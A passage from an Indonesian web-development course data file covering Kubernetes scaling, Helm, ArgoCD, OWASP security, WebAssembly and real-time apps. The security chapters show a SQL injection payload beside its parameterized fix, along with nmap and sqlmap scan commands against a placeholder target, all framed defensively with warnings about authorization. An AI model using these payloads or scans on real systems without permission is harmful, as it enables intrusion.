    aiPrompt: "Deploy aplikasi ke Kubernetes dengan 3 replicas.",
    reflection: "Bedanya Pod, Deployment, dan Service?",
  },
  {
    id: "11.3",
    moduleId: 11,
    chapterNum: "11.3",
    title: "Scaling dan Auto-Healing",
    subtitle: "Scale otomatis dan recovery dari failure",
    level: "Lanjut",
    objectives: ["Memahami HPA dan auto-healing", "Bisa setup scaling policies"],
    analogy: { diagram: "Manual Scale = Naik turun tangga manual\nCapek, lambat\n\nAuto Scale = Lift otomatis\nDatang sendiri saat butuh", caption: "HPA (Horizontal Pod Autoscaler) scale pod berdasarkan metrics" },
    explanation: "**Horizontal Pod Autoscaler (HPA)** secara otomatis menambah atau mengurangi jumlah pod berdasarkan metrics.\n\n**Metrics yang bisa dipakai:**\n\n1. **CPU Utilization.** Scale up kalau CPU > 70%.\n2. **Memory Usage.** Scale up kalau memory hampir penuh.\n3. **Custom Metrics.** Request per detik, queue depth.\n\n**Cara kerja HPA:**\n\n1. Metrics server mengumpulkan data dari setiap pod.\n2. HPA membandingkan actual metrics dengan target.\n3. Kalau perlu, HPA ubah replicas di Deployment.\n4. Deployment buat atau hapus pod sesuai replicas baru.\n\n**Auto-Healing:**\n\nK8s secara otomatis restart container yang crash. Replace pod yang mati di node yang failed. Reconcile state — kalau desired state 3 replicas tapi cuma 2 yang jalan, buat 1 lagi.",
    codeExample: { language: "yaml", code: "apiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: web-app-hpa\nspec:\n  scaleTargetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: web-app\n  minReplicas: 2\n  maxReplicas: 10\n  metrics:\n  - type: Resource\n    resource:\n      name: cpu\n      target:\n        type: Utilization\n        averageUtilization: 70" },
    explainAlong: "HPA scale Deployment web-app. Min 2 replicas, max 10. Scale saat CPU > 70%.",
    aiPrompt: "Setup HPA untuk aplikasi dengan CPU target 70%.",
    reflection: "Kenapa HPA lebih baik dari manual scaling?",
  },
  {
    id: "11.4",
    moduleId: 11,
    chapterNum: "11.4",
    title: "Helm: Package Manager Kubernetes",
    subtitle: "Template dan manage K8s application",
    level: "Lanjut",
    objectives: ["Memahami Helm charts", "Bisa membuat Helm chart"],
    analogy: { diagram: "K8s Manifest = Manual\nTulis satu per satu\n\nHelm = Template\nSatu template, banyak environment", caption: "Helm menyederhanakan deployment aplikasi K8s yang kompleks" },
    explanation: "**Helm** adalah package manager untuk Kubernetes. Helm menyederhanakan deployment aplikasi yang kompleks.\n\n**Tiga konsep Helm:**\n\n1. **Chart.** Package Helm — berisi template K8s, values, dan metadata.\n2. **Release.** Instance chart yang di-deploy ke cluster.\n3. **Repository.** Tempat menyimpan dan mendistribusikan chart.\n\n**Kenapa Helm?**\n\n1. **Templating.** Satu template, banyak environment (dev, staging, prod).\n2. **Versioning.** Rollback ke versi sebelumnya kalau deploy gagal.\n3. **Dependencies.** Chart bisa bergantung pada chart lain.\n4. **Community.** Banyak chart siap pakai (database, monitoring).\n\n**Templating:**\n\nGunakan Go template syntax. Values dari values.yaml di-render saat install.",
    codeExample: { language: "yaml", code: "# values.yaml\nreplicaCount: 3\nimage:\n  repository: myapp\n  tag: v1.0\n\n# templates/deployment.yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Chart.Name }}\nspec:\n  replicas: {{ .Values.replicaCount }}\n  template:\n    spec:\n      containers:\n      - image: {{ .Values.image.repository }}:{{ .Values.image.tag }}" },
    explainAlong: "Values di values.yaml di-render ke template. {{ .Values.replicaCount }} jadi 3.",
    aiPrompt: "Buat Helm chart untuk aplikasi dengan values untuk dev dan prod.",
    reflection: "Kenapa Helm lebih baik dari manifest YAML murni?",
  },
  {
    id: "11.5",
    moduleId: 11,
    chapterNum: "11.5",
    title: "GitOps dengan ArgoCD",
    subtitle: "Deploy ke K8s otomatis dari Git",
    level: "Lanjut",
    objectives: ["Memahami GitOps", "Bisa setup ArgoCD"],
    analogy: { diagram: "GitOps = Deploy dari Git\nPush ke Git, otomatis deploy\n\nTraditional = Manual deploy\nKlik-klik, rentan human error", caption: "GitOps membuat deployment terdokumentasi dan otomatis" },
    explanation: "**GitOps** adalah pendekatan deployment di mana Git menjadi source of truth untuk infrastruktur. Semua konfigurasi ada di Git.\n\n**Prinsip GitOps:**\n\n1. **Declarative.** Sistem dideskripsikan secara deklaratif di Git.\n2. **Versioned.** Setiap perubahan ada history dan bisa di-rollback.\n3. **Pulled.** Agent di cluster menarik konfigurasi dari Git.\n4. **Continuously Reconciled.** Agent selalu memastikan cluster state = Git state.\n\n**ArgoCD** adalah tool GitOps untuk Kubernetes.\n\n**Cara kerja ArgoCD:**\n\n1. Kamu push manifest K8s ke repository Git.\n2. ArgoCD memantau repository tersebut.\n3. Saat ada perubahan, ArgoCD otomatis apply ke cluster.\n4. Dashboard ArgoCD menunjukkan status sync dan health aplikasi.\n\n**Keuntungan GitOps:**\n\nAudit trail. Rollback. Disaster recovery. Separation of concerns.",
    codeExample: { language: "yaml", code: "apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: web-app\n  namespace: argocd\nspec:\n  project: default\n  source:\n    repoURL: https://github.com/company/k8s-configs\n    targetRevision: main\n    path: apps/web\n  destination:\n    server: https://kubernetes.default.svc\n    namespace: production\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true" },
    explainAlong: "ArgoCD memantau Git repo. Auto-sync dan self-heal. Prune menghapus resource yang tidak ada di Git.",
    aiPrompt: "Setup ArgoCD untuk auto-deploy dari repository Git.",
    reflection: "Bedanya GitOps dan traditional CI/CD?",
  },
  {
    id: "11.6",
    moduleId: 11,
    chapterNum: "11.6",
    title: "CI/CD Pipeline untuk Kubernetes",
    subtitle: "Automate build, test, dan deploy ke K8s",
    level: "Lanjut",
    objectives: ["Memahami CI/CD untuk K8s", "Bisa membuat pipeline dasar"],
    analogy: { diagram: "Manual Deploy = Memasak manual\nSetiap langkah dikerjakan tangan\n\nCI/CD = Dapur otomatis\nMasukkan bahan, keluar hidangan", caption: "CI/CD pipeline mengotomasi seluruh proses dari commit sampai deploy" },
    explanation: "**CI/CD (Continuous Integration / Continuous Deployment)** pipeline mengotomasi proses dari code commit sampai production deploy.\n\n**Pipeline stages:**\n\n1. **Build.** Compile code, build Docker image.\n2. **Test.** Jalankan unit test, integration test.\n3. **Security Scan.** Scan vulnerability di image dan dependencies.\n4. **Push.** Push image ke container registry.\n5. **Deploy.** Update K8s manifests dan apply ke cluster.\n\n**Tools CI/CD:**\n\n- **GitHub Actions.** Integrasi native dengan GitHub.\n- **GitLab CI.** Built-in ke GitLab.\n- **Argo Workflows.** Native K8s workflow engine.\n- **Tekton.** Cloud-native CI/CD framework.",
    codeExample: { language: "yaml", code: "name: Deploy to K8s\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Build Docker Image\n        run: docker build -t myapp:${{ github.sha }} .\n      \n      - name: Push to Registry\n        run: docker push myapp:${{ github.sha }}\n      \n      - name: Update K8s Manifest\n        run: |\n          sed -i 's|image:.*|image: myapp:${{ github.sha }}|' k8s/deployment.yaml\n          git add . && git commit -m \"deploy: ${{ github.sha }}\" && git push" },
    explainAlong: "Trigger saat push ke main. Build image, push, update manifest. ArgoCD sync otomatis.",
    aiPrompt: "Buat GitHub Actions pipeline untuk build dan deploy ke Kubernetes.",
    reflection: "Kenapa butuh security scan di CI/CD pipeline?",
  }
];


// ============================================================
// MODUL 12: KEAMANAN LANJUT (4 chapters)
// ============================================================

const modul12: Chapter[] = [
  {
    id: "12.1",
    moduleId: 12,
    chapterNum: "12.1",
    title: "OWASP Top 10 Deep Dive",
    subtitle: "Pahami ancaman web paling kritis",
    level: "Lanjut",
    objectives: ["Memahami OWASP Top 10 detail", "Bisa mengidentifikasi vulnerability"],
    analogy: { diagram: "OWASP = Daftar Buronan\n10 ancaman paling dicari\n\nDeveloper = Detektif\nTahu cara mengidentifikasi dan cegah", caption: "OWASP Top 10 adalah standar industri untuk ancaman web" },
    explanation: "**OWASP Top 10** adalah daftar 10 risiko keamanan web paling kritis. Versi terbaru adalah 2021.\n\n**A01: Broken Access Control.** User bisa akses resource yang seharusnya tidak boleh. Contoh: ganti URL /user/123 jadi /user/124 dan lihat data orang lain.\n\n**A02: Cryptographic Failures.** Data sensitif tidak dienkripsi. Password plain text, TLS tidak dipakai, algoritma lemah.\n\n**A03: Injection.** Input tidak di-validate masuk ke query. SQL injection, NoSQL injection, OS command injection.\n\n**A04: Insecure Design.** Flaw di desain aplikasi. Tidak ada rate limiting, business logic flaw.\n\n**A05: Security Misconfiguration.** Konfigurasi default tidak aman. Error message expose info, unnecessary features enabled.\n\n**A06: Vulnerable Components.** Dependency dengan vulnerability yang diketahui. Old library versions.\n\n**A07: Authentication Failures.** Autentikasi lemah. Brute force possible, session tidak expire.\n\n**A08: Data Integrity Failures.** Data bisa diubah tanpa deteksi.\n\n**A09: Logging Failures.** Tidak ada audit trail. Attack tidak terdeteksi.\n\n**A10: SSRF.** Server membuat request ke internal resources yang seharusnya tidak bisa diakses.",
    codeExample: { language: "typescript", code: "// SQL INJECTION — VULNERABLE\nconst user = await db.query(`SELECT * FROM users WHERE email = '${email}'`);\n// Input: ' OR '1'='1' --\n// Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'\n// Mengembalikan SEMUA user!\n\n// SQL INJECTION — FIXED\nconst user = await db.query('SELECT * FROM users WHERE email = ?', [email]);\n// Parameterized query — input diperlakukan sebagai data, bukan query" },
    explainAlong: "Vulnerable: string concatenation. Fixed: parameterized query. Input selalu diperlakukan sebagai data.",
    aiPrompt: "Identifikasi 3 vulnerability di aplikasi kamu berdasarkan OWASP Top 10.",
    reflection: "Kenapa SQL injection masih menjadi ancaman setelah 20 tahun?",
  },
  {
    id: "12.2",
    moduleId: 12,
    chapterNum: "12.2",
    title: "XSS dan CSRF Lanjutan",
    subtitle: "Serangan client-side dan cara pencegahannya",
    level: "Lanjut",
    objectives: ["Memahami XSS dan CSRF advanced", "Bisa implementasi CSP dan token"],
    analogy: { diagram: "XSS = Menyusupkan script jahat\nSeperti graffiti di dinding website\n\nCSRF = Memaksa user lakukan aksi\nSeperti orang lain tanda tangan atas nama kamu", caption: "XSS dan CSRF adalah ancaman client-side yang paling umum" },
    explanation: "**XSS (Cross-Site Scripting)** adalah serangan yang menyisipkan malicious script ke halaman web. Script berjalan di browser user dengan privilege website tersebut.\n\n**Tiga jenis XSS:**\n\n1. **Stored XSS.** Script disimpan di database. Affect semua user yang melihat page. Paling berbahaya.\n2. **Reflected XSS.** Script di URL. Biasanya via phishing link.\n3. **DOM-based XSS.** Script memanipulasi DOM client-side tanpa melalui server.\n\n**Mitigasi XSS:**\n\n1. **Escape output.** Jangan render user input sebagai HTML.\n2. **CSP (Content Security Policy).** Whitelist domain yang boleh load script.\n3. **DOMPurify.** Sanitize HTML sebelum render.\n4. **HttpOnly cookie.** Cookie tidak bisa diakses JavaScript.\n\n**CSRF (Cross-Site Request Forgery)** memaksa user yang sudah login melakukan aksi tidak diinginkan.\n\n**Mitigasi CSRF:**\n\n1. **CSRF Token.** Server generate token unik. Form harus include token.\n2. **SameSite Cookie.** Cookie tidak dikirim saat request dari domain lain.\n3. **Validate Origin Header.** Pastikan request berasal dari domain yang sama.",
    codeExample: { language: "text", code: "// CSP HEADER\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-abc123' https://cdn.example.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' https: data:;\n  connect-src 'self' https://api.example.com;\n  report-uri /csp-report\n\n// SAME SITE COOKIE\nSet-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure" },
    explainAlong: "CSP whitelist sumber resource. SameSite=Strict mencegah cookie dikirim cross-origin. Defense in depth.",
    aiPrompt: "Implementasikan CSP dan SameSite cookie di aplikasi.",
    reflection: "Bedanya XSS dan CSRF dari perspektif attacker?",
  },
  {
    id: "12.3",
    moduleId: 12,
    chapterNum: "12.3",
    title: "Security Hardening dan Bug Bounty",
    subtitle: "Amankan aplikasi dan dapat penghasilan dari bug",
    level: "Lanjut",
    objectives: ["Memahami security hardening", "Mengetahui cara mulai bug bounty"],
    analogy: { diagram: "Security Hardening = Memperkuat benteng\nSetiap lapisan diperkuat\n\nBug Bounty = Jadi security tester\nCari bug, dapat bayaran", caption: "Security hardening melindungi aplikasi dari berbagai ancaman" },
    explanation: "**Security Hardening** adalah proses mengamankan aplikasi dengan mengurangi attack surface.\n\n**Hardening layers:**\n\n1. **Network.** Firewall, DDoS protection, VPC isolation.\n2. **OS.** Disable unused services, apply patches, least privilege.\n3. **Application.** Input validation, parameterized queries, secure headers.\n4. **Data.** Encryption at rest dan in transit, key management.\n5. **Account.** MFA, strong password policy, session management.\n\n**Security Headers:**\n\n- **HSTS.** Force HTTPS, prevent downgrade attacks.\n- **X-Frame-Options.** Prevent clickjacking.\n- **X-Content-Type-Options.** Prevent MIME sniffing.\n\n**Bug Bounty** adalah program di mana perusahaan membayar researcher untuk menemukan vulnerability.\n\n**Platform:** HackerOne, Bugcrowd, Intigriti.\n\n**Cara mulai:** Pelajari OWASP Top 10. Praktik di platform hacking legal. Mulai dari program yang menerima pemula.",
    codeExample: { language: "typescript", code: "// SECURITY HEADERS MIDDLEWARE\napp.use((c, next) => {\n  c.header('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');\n  c.header('X-Frame-Options', 'DENY');\n  c.header('X-Content-Type-Options', 'nosniff');\n  c.header('Referrer-Policy', 'strict-origin-when-cross-origin');\n  c.header('Permissions-Policy', 'camera=(), microphone=()');\n  return next();\n});" },
    explainAlong: "Set security headers di setiap response. HSTS force HTTPS. X-Frame-Options prevent clickjacking.",
    aiPrompt: "Audit security headers aplikasi kamu dengan securityheaders.com.",
    reflection: "Layer mana yang paling sering diabaikan dalam security hardening?",
  },
  {
    id: "12.4",
    moduleId: 12,
    chapterNum: "12.4",
    title: "Penetration Testing Dasar",
    subtitle: "Cari vulnerability sebelum attacker menemukannya",
    level: "Lanjut",
    objectives: ["Memahami metodologi pentest", "Bisa menggunakan tools dasar"],
    analogy: { diagram: "Pentest = Security Audit\nCari celah sebelum orang jahat\n\nSeperti pemeriksaan kesehatan\nDeteksi dini, pencegahan lebih baik", caption: "Penetration testing menemukan vulnerability sebelum di-exploit attacker" },
    explanation: "**Penetration Testing (Pentest)** adalah simulasi serangan untuk menemukan vulnerability sebelum attacker yang sebenarnya.\n\n**Metodologi pentest:**\n\n1. **Reconnaissance.** Kumpulkan informasi tentang target. DNS, subdomain, tech stack.\n2. **Scanning.** Scan port, services, vulnerability otomatis.\n3. **Exploitation.** Coba eksploit vulnerability yang ditemukan.\n4. **Post-exploitation.** Cari akses lebih dalam lateral movement.\n5. **Reporting.** Dokumentasikan temuan dengan proof of concept.\n\n**Tools pentest:**\n\n1. **Nmap.** Network scanner — port, OS, service detection.\n2. **Burp Suite.** Web vulnerability scanner dan proxy.\n3. **sqlmap.** SQL injection automation.\n4. **Metasploit.** Framework untuk eksploit development.\n5. **OWASP ZAP.** Open-source web scanner.\n\n**Legal considerations:**\n\nPentest HARUS punya written authorization. Tanpa izin, pentest adalah illegal hacking.\n\n**Responsible disclosure:**\n\nKetemu vulnerability? Laporkan ke perusahaan, beri waktu 90 hari untuk fix sebelum publish.",
    codeExample: { language: "bash", code: "# NMAP — NETWORK SCAN\n# Scan port terbuka\nnmap -sS target.com\n\n# Scan dengan OS detection\nnmap -O target.com\n\n# Scan all ports\nnmap -p- target.com\n\n# SQLMAP — SQL INJECTION TEST\nsqlmap -u \"https://target.com/search?q=test\" \\\n  --batch --level=3 --risk=2\n\n# Burp Suite — intercept request\n# 1. Set proxy di browser: 127.0.0.1:8080\n# 2. Intercept request di Burp\n# 3. Modify dan forward" },
    explainAlong: "Nmap scan port dan OS. Sqlmap otomatis test SQL injection. Burp Suite intercept dan modify request.",
    aiPrompt: "Lakukan port scan terhadap server development kamu.",
    reflection: "Kenapa pentest butuh written authorization?",
  }
];


// ============================================================
// MODUL 13: WEBASSEMBLY & HIGH PERFORMANCE (4 chapters)
// ============================================================

const modul13: Chapter[] = [
  {
    id: "13.1",
    moduleId: 13,
    chapterNum: "13.1",
    title: "WebAssembly: Konsep dan Use Cases",
    subtitle: "Performa near-native di browser",
    level: "Lanjut",
    objectives: ["Memahami konsep WASM", "Mengetahui use cases WASM"],
    analogy: { diagram: "JavaScript = Interpreter\nBaca per baris, jalankan\n\nWASM = Binary\nCompile sekali, jalankan cepat", caption: "WASM membawa performa near-native ke browser" },
    explanation: "**WebAssembly (WASM)** adalah binary instruction format yang berjalan di browser dengan performa near-native. WASM bukan pengganti JavaScript — melainkan partner.\n\n**Kenapa WASM?**\n\n1. **Performa.** Kode compile jauh lebih cepat dari JavaScript interpreted.\n2. **Portability.** Satu binary berjalan di semua browser dan platform.\n3. **Language choice.** Tulis di Rust, C++, Go — compile ke WASM.\n\n**Use cases:**\n\n1. **Game browser.** Unity, Unreal Engine support WASM.\n2. **Video/photo editing.** Photoshop web, Figma.\n3. **ML inference.** TensorFlow.js dengan WASM backend.\n4. **Cryptography.** Operasi crypto yang intensif.\n5. **Scientific computing.** Simulasi, rendering di browser.\n\n**Limitasi:**\n\nTidak bisa akses DOM langsung (harus via JS bridge). Tidak punya garbage collector (manual memory management). File size binary lebih besar dari JavaScript.",
    codeExample: { language: "javascript", code: "async function loadWasm() {\n  const response = await fetch('/app.wasm');\n  const bytes = await response.arrayBuffer();\n  const module = await WebAssembly.instantiate(bytes, {\n    env: {\n      memory: new WebAssembly.Memory({ initial: 256 }),\n      abort: () => console.log('abort')\n    }\n  });\n  const result = module.instance.exports.add(5, 3);\n  console.log(result); // 8\n}" },
    explainAlong: "Fetch wasm file, instantiate dengan imports, panggil exported function. Memory dibagikan antara JS dan WASM.",
    aiPrompt: "Jelaskan 3 use cases WASM yang cocok untuk aplikasi web.",
    reflection: "Kapan WASM lebih baik dari JavaScript?",
  },
  {
    id: "13.2",
    moduleId: 13,
    chapterNum: "13.2",
    title: "Rust ke WebAssembly",
    subtitle: "Tulis kode Rust, compile ke WASM",
    level: "Lanjut",
    objectives: ["Memahami Rust-WASM toolchain", "Bisa compile Rust ke WASM"],
    analogy: { diagram: "Rust = Ahli Tukang\nMemory safety, zero-cost abstraction\n\nWASM = Mesin\nJalankan kode dengan performa tinggi", caption: "Rust adalah bahasa terbaik untuk WASM development" },
    explanation: "**Rust** adalah bahasa sistem dengan memory safety tanpa garbage collector. Rust menjadi bahasa pilihan untuk WASM karena performa dan safety.\n\n**Kenapa Rust untuk WASM?**\n\n1. **Memory safety.** Ownership system mencegah memory leak dan use-after-free.\n2. **Zero-cost abstraction.** High-level feature tanpa runtime overhead.\n3. **WASM support first-class.** Toolchain mature dan well-documented.\n\n**Toolchain:**\n\n1. **wasm-pack.** Build, test, dan publish Rust-generated WASM.\n2. **wasm-bindgen.** Facilitate JS-WASM interop (pass string, object, Promise).\n3. **web-sys.** Bindings untuk Web API (DOM, fetch, canvas).\n\n**Workflow:**\n\nInstall Rust dan wasm-pack. Buat project dengan cargo generate. Tulis kode Rust dengan #[wasm_bindgen]. Build dengan wasm-pack build --target web. Import di JavaScript.",
    codeExample: { language: "rust", code: "use wasm_bindgen::prelude::*;\n\n#[wasm_bindgen]\npub fn fibonacci(n: u32) -> u32 {\n    match n {\n        0 => 0,\n        1 => 1,\n        _ => fibonacci(n - 1) + fibonacci(n - 2),\n    }\n}" },
    explainAlong: "wasm_bindgen macro membuat fungsi callable dari JS. Build menghasilkan pkg/ dengan WASM dan JS bindings.",
    aiPrompt: "Implementasikan fungsi sort di Rust dan panggil dari JavaScript.",
    reflection: "Kenapa Rust lebih cocok untuk WASM daripada C++?",
  },
  {
    id: "13.3",
    moduleId: 13,
    chapterNum: "13.3",
    title: "WebGPU dan Parallel Processing",
    subtitle: "Grafis dan komputasi paralel di browser",
    level: "Lanjut",
    objectives: ["Memahami WebGPU", "Mengetahui Web Workers"],
    analogy: { diagram: "WebGPU = GPU Programming\nManfaatkan GPU untuk komputasi\n\nWeb Worker = Multi-threading\nJalankan kode di background thread", caption: "WebGPU dan Web Workers membawa parallel processing ke browser" },
    explanation: "**WebGPU** adalah API modern untuk mengakses GPU dari browser. Successor WebGL dengan access ke compute shader.\n\n**Bedanya WebGL dan WebGPU:**\n\n- **WebGL.** Berdasarkan OpenGL ES. Hanya untuk graphics. Limited compute.\n- **WebGPU.** Berdasarkan Vulkan/Metal/Direct3D 12. Graphics + general compute.\n\n**Use cases WebGPU:**\n\n1. **3D rendering.** Game, visualization, CAD di browser.\n2. **ML inference.** GPU-accelerated neural network.\n3. **Scientific computing.** Simulation, data processing.\n4. **Image/video processing.** Filter, encode/decode.\n\n**Web Workers** untuk multi-threading di JavaScript.\n\n**Kenapa Web Workers?**\n\nJavaScript single-threaded. Long-running task block UI. Web Workers jalankan kode di background thread.\n\n**SharedArrayBuffer** memungkinkan memory sharing antara main thread dan worker.",
    codeExample: { language: "javascript", code: "// WEB WORKER\n// worker.js\nself.onmessage = (e) => {\n  const result = heavyComputation(e.data);\n  self.postMessage(result);\n};\n\n// main.js\nconst worker = new Worker('worker.js');\nworker.postMessage(largeArray);\nworker.onmessage = (e) => {\n  console.log('Result:', e.data);\n};\n\n// WEBGPU\nconst adapter = await navigator.gpu.requestAdapter();\nconst device = await adapter.requestDevice();" },
    explainAlong: "Web Worker jalankan kode di background thread. WebGPU akses GPU untuk compute. Tidak block main thread.",
    aiPrompt: "Implementasikan Web Worker untuk processing data besar.",
    reflection: "Kapan pakai WebGPU vs Web Workers?",
  },
  {
    id: "13.4",
    moduleId: 13,
    chapterNum: "13.4",
    title: "Optimasi Performa Frontend",
    subtitle: "Teknik optimasi untuk aplikasi web cepat",
    level: "Lanjut",
    objectives: ["Memahami Core Web Vitals", "Bisa mengoptimasi performa"],
    analogy: { diagram: "Performa = Kecepatan\nUser tidak suka menunggu\n\nOptimasi = Upgrade Mesin\nLebih cepat, lebih efisien", caption: "Core Web Vitals adalah metrik Google untuk user experience" },
    explanation: "**Core Web Vitals** adalah tiga metrik Google untuk mengukur user experience di website.\n\n**LCP (Largest Contentful Paint).**\nWaktu elemen terbesar terlihat di viewport. Target: < 2.5 detik.\n\n**INP (Interaction to Next Paint).**\nWaktu browser merespons interaksi user. Target: < 200ms.\n\n**CLS (Cumulative Layout Shift).**\nSeberapa banyak layout bergerak saat loading. Target: < 0.1.\n\n**Teknik optimasi:**\n\n1. **Code splitting.** Load hanya kode yang dibutuhkan per page.\n2. **Lazy loading.** Load gambar dan component saat mendekati viewport.\n3. **Image optimization.** WebP format, responsive images, proper sizing.\n4. **Caching.** Service Worker, HTTP cache, CDN.\n5. **Minimize JavaScript.** Remove unused code, tree shaking.\n6. **Font optimization.** Preload critical fonts, font-display: swap.\n7. **Reduce third-party scripts.** Audit dan hapus yang tidak perlu.",
    codeExample: { language: "tsx", code: "import { lazy, Suspense } from 'react';\n\nconst HeavyChart = lazy(() => import('./HeavyChart'));\n\nfunction Dashboard() {\n  return (\n    <div>\n      <Header />\n      <Suspense fallback={<Spinner />}>\n        <HeavyChart />\n      </Suspense>\n    </div>\n  );\n}" },
    explainAlong: "React.lazy load component saat dibutuhkan. Suspense tampilkan fallback saat loading. Bundle size lebih kecil.",
    aiPrompt: "Audit performa aplikasi dengan Lighthouse. Catat skor Core Web Vitals.",
    reflection: "Metrik Core Web Vitals mana yang paling sulit dioptimasi?",
  }
];


// ============================================================
// MODUL 14: WEBRTC & REAL-TIME COMMUNICATION (4 chapters)
// ============================================================

const modul14: Chapter[] = [
  {
    id: "14.1",
    moduleId: 14,
    chapterNum: "14.1",
    title: "WebRTC: Komunikasi Real-time",
    subtitle: "Video, audio, dan data secara peer-to-peer",
    level: "Lanjut",
    objectives: ["Memahami konsep WebRTC", "Mengetahui arsitektur peer-to-peer"],
    analogy: { diagram: "WebRTC = Video Call Langsung\nTidak perlu server untuk data\n\nServer = Perantara Awal\nSetelah terhubung, komunikasi langsung", caption: "WebRTC memungkinkan komunikasi real-time tanpa plugin" },
    explanation: "**WebRTC (Web Real-Time Communication)** adalah teknologi yang memungkinkan video, audio, dan data sharing langsung di browser. Tanpa plugin, tanpa install aplikasi.\n\n**Tiga API utama:**\n\n1. **getUserMedia.** Akses kamera dan microphone user.\n2. **RTCPeerConnection.** Establishes direct connection antara peers.\n3. **RTCDataChannel.** Kirim data arbitrary (text, file, binary) secara peer-to-peer.\n\n**Cara kerja:**\n\n1. User A dan B dapatkan media stream dari getUserMedia.\n2. Tukar SDP (Session Description Protocol) via signaling server.\n3. ICE (Interactive Connectivity Establishment) cari route terbaik.\n4. Direct peer-to-peer connection establis.\n5. Media dan data mengalir langsung antar browser.\n\n**Signaling server hanya untuk setup.** Setelah connection establis, data mengalir langsung P2P tanpa melalui server.\n\n**ICE candidates:**\n\n- **Host.** Langsung dalam LAN (paling cepat).\n- **SRFLX.** Via NAT (paling umum).\n- **TURN.** Via relay server (fallback kalau P2P gagal).",
    codeExample: { language: "javascript", code: "// GET USER MEDIA\nconst stream = await navigator.mediaDevices.getUserMedia({\n  video: true,\n  audio: true\n});\nvideoElement.srcObject = stream;\n\n// RTC PEER CONNECTION\nconst pc = new RTCPeerConnection({\n  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]\n});\nstream.getTracks().forEach(track =>\n  pc.addTrack(track, stream)\n);" },
    explainAlong: "getUserMedia akses kamera dan microphone. RTCPeerConnection dengan STUN server untuk NAT traversal.",
    aiPrompt: "Buat aplikasi video call sederhana dengan WebRTC.",
    reflection: "Kenapa WebRTC butuh signaling server?",
  },
  {
    id: "14.2",
    moduleId: 14,
    chapterNum: "14.2",
    title: "Socket.IO dan Real-time Backend",
    subtitle: "Broadcast dan room management",
    level: "Lanjut",
    objectives: ["Memahami Socket.IO", "Bisa implementasi room dan broadcast"],
    analogy: { diagram: "HTTP = Surat\nKirim, tunggu balasan\n\nWebSocket = Telepon\nDua arah, real-time, terus-menerus", caption: "Socket.IO menyederhanakan WebSocket dengan fallback otomatis" },
    explanation: "**Socket.IO** adalah library real-time communication yang menyederhanakan WebSocket. Dengan fallback otomatis kalau WebSocket tidak tersedia.\n\n**Bedanya WebSocket dan Socket.IO:**\n\n- **WebSocket.** Protocol native, low-level, tidak ada fallback.\n- **Socket.IO.** Library high-level, auto-reconnect, room, broadcast.\n\n**Fitur Socket.IO:**\n\n1. **Auto-reconnect.** Koneksi putus? Otomatis reconnect.\n2. **Room.** Group client untuk broadcast ter-target.\n3. **Namespace.** Pisahkan logic (chat namespace, notif namespace).\n4. **Middleware.** Authentication dan authorization.\n5. **Binary support.** Kirim file dan blob.\n\n**Use cases:**\n\n1. **Live chat.** Pesan muncul tanpa refresh.\n2. **Collaborative editing.** Google Docs-style editing.\n3. **Live notifications.** Notifikasi real-time.\n4. **Gaming.** Multiplayer game state sync.\n5. **Dashboard real-time.** Stock price, analytics live.\n\n**Scaling:**\n\nUntuk multiple server, pakai Redis Adapter. Semua server terhubung via Redis Pub/Sub. Broadcast ke room mencakup semua server.",
    codeExample: { language: "typescript", code: "// SOCKET.IO SERVER\nimport { Server } from 'socket.io';\nconst io = new Server(server);\n\nio.on('connection', (socket) => {\n  console.log('User connected:', socket.id);\n  \n  // Join room\n  socket.join('room-123');\n  \n  // Broadcast ke room\n  socket.to('room-123').emit('message', {\n    user: socket.id,\n    text: 'Hello room!'\n  });\n  \n  socket.on('disconnect', () => {\n    console.log('User disconnected');\n  });\n});" },
    explainAlong: "Socket.IO handle connection, room join, broadcast. Auto-reconnect dan fallback bawaan.",
    aiPrompt: "Implementasikan chat room dengan Socket.IO dan Redis adapter.",
    reflection: "Kapan pakai WebSocket langsung vs Socket.IO?",
  },
  {
    id: "14.3",
    moduleId: 14,
    chapterNum: "14.3",
    title: "Real-time Database dan Event Streaming",
    subtitle: "Data yang sync secara otomatis antar client",
    level: "Lanjut",
    objectives: ["Memahami real-time database", "Bisa setup event streaming"],
    analogy: { diagram: "Real-time DB = Papan Tulis Bersama\nSemua orang lihat perubahan\n\nEvent Streaming = Sungai Data\nMengalir terus, bisa dipantau", caption: "Real-time database memungkinkan kolaborasi tanpa refresh" },
    explanation: "**Real-time Database** memungkinkan data otomatis sync antara server dan semua client yang terhubus. Kalau satu client mengubah data, semua client lain melihat perubahan seketika.\n\n**Firebase Realtime Database:**\n\nJSON tree yang sync otomatis. Setiap perubahan di-push ke semua subscriber. Cocok untuk chat, live dashboard, collaborative app.\n\n**Supabase Realtime:**\n\nPostgreSQL dengan realtime subscription. Listen perubahan di table tertentu. Lebih powerful karena SQL query.\n\n**Event Streaming:**\n\nUntuk skala besar, pakai event streaming. Data di-produce ke stream, consumer listen dan process.\n\n**Apache Kafka:**\n\nDistributed event streaming platform. High throughput, persistent, scalable. Topics dan partitions untuk parallel processing.\n\n**Use cases event streaming:**\n\n1. **Activity feed.** User action di-produce ke stream.\n2. **Analytics.** Event stream untuk real-time analytics.\n3. **Microservices communication.** Decouple services via events.",
    codeExample: { language: "typescript", code: "// SUPABASE REALTIME\nimport { createClient } from '@supabase/supabase-js';\nconst supabase = createClient(url, key);\n\nconst channel = supabase\n  .channel('table-changes')\n  .on('postgres_changes',\n    { event: '*', schema: 'public', table: 'messages' },\n    (payload) => console.log('Change:', payload)\n  )\n  .subscribe();\n\n// KAFKA PRODUCER\nawait producer.send({\n  topic: 'user-events',\n  messages: [{\n    key: userId,\n    value: JSON.stringify({ type: 'login', userId })\n  }]\n});" },
    explainAlong: "Supabase realtime listen perubahan PostgreSQL. Kafka producer kirim event ke topic. Consumer process secara async.",
